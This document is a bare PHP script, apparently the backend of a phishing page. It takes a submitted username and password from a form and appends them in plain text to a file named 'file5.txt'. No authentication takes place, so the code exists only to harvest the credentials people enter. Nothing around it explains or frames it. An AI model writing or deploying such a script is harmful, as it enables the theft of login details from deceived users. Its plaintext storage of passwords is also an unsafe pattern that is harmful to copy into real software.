<?php
$username=$_POST["username"];
$password=$_POST["password"];
$file=fopen("file5.txt","a");
$content="username: $username | password: $password";
fwrite($file,$content);
?>
